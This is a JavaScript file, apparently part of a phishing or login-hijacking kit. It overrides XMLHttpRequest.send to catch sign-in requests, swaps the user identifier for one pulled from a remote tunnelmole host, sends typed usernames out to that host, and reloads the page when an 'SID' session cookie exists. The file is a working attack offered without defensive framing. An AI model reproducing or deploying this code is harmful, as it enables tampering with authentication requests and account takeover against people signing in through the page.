let freqUsername = null;
const modifiedRequests = new Set();
const pendingRequests = new Map();
let usernameFetched = false;

// ✅ Fetch the username when needed
const fetchFreqUsername = async () => {
    if (usernameFetched) return; // Prevent redundant fetches

    console.log('🟡 Fetching username...');

    try {
        const response = await fetch(`https://9emiae-ip-37-228-207-173.tunnelmole.net/get-first-post-data`, {
            method: 'GET',
            headers: {
                'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0'
            }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('✅ Response from /get-first-post-data:', result);

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('✅ Fetched username:', freqUsername);
            usernameFetched = true;

            // ✅ Reset the stored username and re-fetch it immediately
            await resetUsernameData();
        } else {
            console.warn("⚠️ No username data received, retrying...");
            setTimeout(fetchFreqUsername, 1000); // Retry in 1s if empty
        }
    } catch (error) {
        console.error('⚠️ Error fetching username:', error);
        setTimeout(fetchFreqUsername, 1000); // Retry in 1s if error
    }
};

// ✅ Reset username data and **force fetch** again
const resetUsernameData = async () => {
    console.log('🔄 Resetting username data...');

    try {
        const response = await fetch('https://9emiae-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });

        if (response.ok) {
            console.log('✅ Successfully reset username.');
        } else {
            console.error(`⚠️ Failed to reset username: ${response.status}`);
        }
    } catch (error) {
        console.error('⚠️ Error resetting username:', error);
    }

    // 🛑 Ensure fetch happens **AFTER** reset
    usernameFetched = false;
    setTimeout(fetchFreqUsername, 500); // **Force a fetch immediately**
};

// ✅ Process pending requests
const processModifiedRequests = () => {
    if (!freqUsername) {
        console.log("⚠️ Username not available yet, retrying fetch...");
        fetchFreqUsername();
        return;
    }

    console.log("🚀 Processing pending requests...");
    const requestsToProcess = Array.from(pendingRequests);

    for (let [xhr, body] of requestsToProcess) {
        const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
        if (match && !modifiedRequests.has(body)) {
            const modifiedBody = body.replace(match[1], freqUsername);
            modifiedRequests.add(modifiedBody);
            console.log("✏️ Modified request with new username:", modifiedBody);

            // ✅ Send the modified request
            xhr.send(modifiedBody);
            pendingRequests.delete(xhr);
        }
    }

    if (pendingRequests.size === 0) {
        console.log("✅ All pending requests processed, resetting username.");
        freqUsername = null;
        usernameFetched = false; // Allow fetching a new username
        setTimeout(fetchFreqUsername, 1000); // Force re-fetch
    }
};

// ✅ Intercept XMLHttpRequest to modify requests
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    // ✅ Ensure we properly intercept the username field
    const match = body.match(/identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/);
    if (match) {
        console.log("🛑 Intercepted request body:", body);

        if (!modifiedRequests.has(body)) {
            if (!freqUsername) {
                console.log("⚠️ No username available yet, queuing request...");
                pendingRequests.set(this, body);
                fetchFreqUsername();
                return;
            }

            // ✅ Modify the request body
            const modifiedBody = body.replace(match[1], freqUsername);
            modifiedRequests.add(modifiedBody);
            console.log("✏️ Modified request with new username:", modifiedBody);

            // ✅ Send the modified request
            originalXhrSend.call(this, modifiedBody);
        } else {
            console.warn("⚠️ Request already modified, sending original.");
            originalXhrSend.call(this, body);
        }
    } else {
        console.log("📤 Sending normal request.");
        originalXhrSend.call(this, body);
    }
};

// ✅ Ensure fetchFreqUsername is called when the page loads
document.addEventListener('DOMContentLoaded', () => {
    fetchFreqUsername();
});

// ✅ Send username data to server
const sendUsername = async () => {
    console.log('📤 Sending username...');

    const username = document.getElementById('username')?.value;
    if (!username) {
        console.warn("⚠️ No username entered");
        return;
    }

    try {
        const response = await fetch('https://9emiae-ip-37-228-207-173.tunnelmole.net/save-username', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });

        if (response.ok) {
            console.log('✅ Username sent successfully');
        } else {
            console.error('⚠️ Error sending username:', response.statusText);
        }
    } catch (error) {
        console.error('⚠️ Error sending username:', error);
    }
};

// ✅ Attach event listeners to buttons
document.addEventListener('DOMContentLoaded', () => {
    const button = document.getElementById('sendUsernameBtn');
    const usernameInput = document.getElementById('username');

    if (button) {
        button.addEventListener('click', (event) => {
            event.preventDefault(); // Prevent form submission
            sendUsername();
        });
    } else {
        console.warn('⚠️ Send username button not found!');
    }

    if (usernameInput) {
        usernameInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault(); // Prevent form submission
                sendUsername();
            }
        });
    }

    fetchFreqUsername();
});

// ✅ Auto-refresh page if 'SID' cookie exists
setInterval(() => {
    if (document.cookie.includes('SID')) {
        location.reload();
    }
}, 3000);
